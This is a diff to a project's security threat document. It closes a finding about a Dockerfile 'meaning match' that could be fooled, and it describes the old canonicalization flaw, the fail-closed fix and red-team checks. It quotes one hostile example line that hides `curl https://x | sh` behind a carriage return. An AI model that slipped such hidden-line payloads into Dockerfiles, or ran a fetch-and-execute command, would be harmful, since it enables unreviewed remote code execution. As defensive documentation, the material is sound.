@@ -29,7 +29,7 @@ Verification is now the control that several other vectors depend on: [NET-2](ne
 
 | ID | Vector | Severity | Status |
 | --- | --- | --- | --- |
-| [VER-1](#ver-1-the-dockerfile-meaning-match-can-be-fooled) | The Dockerfile meaning match can be fooled | High | Open |
+| [VER-1](#ver-1-the-dockerfile-meaning-match-can-be-fooled) | The Dockerfile meaning match can be fooled | High | Closed |
 | [VER-2](#ver-2-any-file-named-dev-envyaml-matches-on-meaning) | Any file named `dev-env.yaml` matches on meaning | High | Open |
 | [VER-3](#ver-3-the-review-doesnt-show-everything-it-accepts) | The review doesn't show everything it accepts | High | Open |
 | [VER-4](#ver-4-exemptions-accept-what-nobody-reviewed) | Exemptions accept what nobody reviewed | High | By design, partly Open |
@@ -46,20 +46,29 @@ Verification is now the control that several other vectors depend on: [NET-2](ne
 
 ### VER-1: The Dockerfile meaning match can be fooled
 
-**Severity:** High.  **Status:** Open.
-**Where:** `canonical_dockerfile` and `is_dockerfile` in [`snapshot.py`](../../scripts/surf_scoter_lib/verified/snapshot.py); the carry-forward in [`lookup.py`](../../scripts/surf_scoter_lib/verified/lookup.py); the Dockerfile listing in [`review.py`](../../scripts/surf_scoter_lib/review.py).
+**Severity:** High.  **Status:** Closed.
+**Where:** `canonical_dockerfile` and `is_dockerfile` in [`snapshot.py`](../../scripts/surf_scoter_lib/verified/snapshot.py); the carry-forward in [`lookup.py`](../../scripts/surf_scoter_lib/verified/lookup.py); `file_lines` and `visible` in [`review.py`](../../scripts/surf_scoter_lib/review.py); `from_findings` in [`checks.py`](../../scripts/surf_scoter_lib/checks.py); `docker: runs: build` in [`setup.yaml`](../../defaults/setup.yaml).
 
-A Dockerfile that differs from the accepted one only in comments and blank lines matches on meaning, and the run carries the acceptance forward without asking.  That's only safe if the canonical form drops exactly what Docker ignores, and it doesn't:
+A Dockerfile that differs from the accepted one only in comments and blank lines matches on meaning, and the run carries the acceptance forward without asking.  That's only safe if the canonical form drops nothing Docker builds from.  It used to drop more:
 
-* **Line breaks.**  `canonical_dockerfile` splits lines with Python's `str.splitlines()`, which also breaks on `\r`, `\v`, `\f`, `\x1c` to `\x1e`, `\x85`, U+2028 and U+2029.  Docker breaks lines only on `\n`.  So `RUN echo ok\r# ; curl https://x | sh` canonicalizes the same as `RUN echo ok`: Python sees a second, comment, line.  Docker sees one line, and the shell should see `ok\r#` as one word and run what follows.  The canonical forms were confirmed equal; that Docker and the shell then run the hidden part hasn't been tested.
-* **Heredocs.**  A quoted heredoc delimiter containing a `-` (`<<"END-1"`) isn't recognized as one, so `#` lines inside the heredoc, which are part of the script, are dropped as comments.
-* **Names.**  Any file named `Dockerfile.*` or `*.Dockerfile` gets the same treatment, so a script with such a name can change its `#!` line, or any `#` line, freely.
+* **Line breaks.**  It split lines with Python's `str.splitlines()`, which also breaks on `\r`, `\v`, `\f`, `\x1c` to `\x1e`, `\x85`, U+2028 and U+2029.  Docker breaks lines only on `\n`.  So `RUN echo ok\r# ; curl https://x | sh` canonicalized the same as `RUN echo ok`: Python saw a second, comment, line, and Docker one line, which the shell runs (confirmed with Podman: the hidden command ran).
+* **Heredocs.**  A heredoc delimiter it didn't recognize, such as `<<"END-1"`, left the heredoc's `#` lines, which are the script, to be dropped as comments.
+* **Names.**  Any file named `Dockerfile.*` or `*.Dockerfile` got the same treatment, so a script with such a name could change its `#!` line, or any `#` line, freely.
+* **The review** split lines the same way, and removed control characters from what it showed, so even a reviewer reading a new Dockerfile saw the hidden part as a separate comment line.
 
-A pulled change using any of these is built without a review, outside the isolation ([DEV-3](dev-container-attack-vectors.md#dev-3-image-builds-run-outside-the-isolation)), and from then on it's what the stored acceptance holds.  The review shows a new Dockerfile with the same `splitlines()`, so even a reviewer reading it sees the hidden part as a separate comment line.
+**What closed it: the canonical form fails closed.**  It doesn't try to be Docker's parser; it gives a meaning hash only for a Dockerfile plainly within what it understands, and none otherwise, so that file matches on its bytes, and any change asks for a review.  A wrong "no match" costs a review; a wrong "match" was the vulnerability.
 
-**Red team:** change an accepted Dockerfile using each of the line breaks above, a hyphenated heredoc delimiter, and a `Dockerfile.sh` script, and check whether `scoter run` asks for a review.  Confirm what Docker and BuildKit run.
+* Lines split on `\n` only, after a `\r\n` becomes `\n` (as Docker drops the `\r`).  Any other control character, C1 control, U+2028, U+2029, or a byte order mark past the start, means no canonical form.
+* Blank lines and comments are told by Docker's whitespace (space and tab) only; every other line, trailing whitespace included, and the parser directives stay as written.
+* Every `<<` on an instruction line must be a heredoc it can follow, and every heredoc must close; otherwise, no canonical form.
+* Only `Dockerfile` gets one: the build names it (`-f {x:dockerfile}`), so Podman can't build a `Containerfile` beside it instead, which the checks wouldn't have read (without `-f`, Podman builds the `Containerfile` when both are there; confirmed).  `docker: runs: build` is guarded.
+* The review shows file contents split on `\n` only, with control characters shown as `\xNN` rather than removed, and the checks warn about a Dockerfile with no canonical form.
 
-**When changing this code:** split lines exactly as Docker does (`\n` only, with a trailing `\r` removed), or refuse a Dockerfile containing any other line-breaking or control character.  Recognize every delimiter form Docker accepts, or treat a heredoc that isn't understood as bytes only.  Limit the comment stripping to files the build actually reads as Dockerfiles.  Show the review with the same splitting.
+Acceptances made before the change kept the old meaning hashes, so a Dockerfile that changes hash under the new form gets a review once.
+
+**Red team:** look for anything else Docker or BuildKit reads from a line that the canonical form drops as a comment or a blank line: other whitespace, other heredoc forms, comments within a continuation, parser directives after the first instruction, a Dockerfile in another encoding.  Check that `scoter run` asks for a review for each of the old vectors.
+
+**When changing this code:** keep it failing closed.  Any new kind of change it lets through as "the same meaning" must be one Docker provably ignores; when unsure, give no canonical form.  Keep the review splitting lines as Docker does.
 
 ### VER-2: Any file named `dev-env.yaml` matches on meaning
 
